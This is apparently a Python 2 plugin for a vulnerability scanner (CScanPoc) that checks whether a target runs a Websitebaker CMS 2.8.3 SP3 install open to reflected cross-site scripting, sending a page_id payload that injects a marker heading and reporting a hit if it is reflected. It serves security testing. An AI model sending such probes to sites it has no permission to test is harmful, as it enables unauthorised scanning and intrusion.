# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WebsitebakerCMS_0006' # 平台漏洞编号，留空
    name = 'CMS Websitebaker 2.8.3 SP3 Cross Site Scripting' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2015-01-19'  # 漏洞公布时间
    desc = '''
        CMS Websitebaker 2.8.3 SP3 Cross Site Scripting
    ''' # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/130008/CMS-Websitebaker-2.8.3-SP3-Cross-Site-Scripting.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'WebsiteBakerCMS'  # 漏洞应用名称
    product_version = '2.8.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '106ad446-bbef-4062-818d-91b0d2d8135d'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            payload = '/admin/pages/modify.php?page_id=1%22><h1>xss%20here</h1><!--'
            url += payload
            code, head, res, errcode, final_url = hh.http(url)
            #print "[*]Request URL: " + url
            if code == 200 and re.search("<h1>xss here</h1>", res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()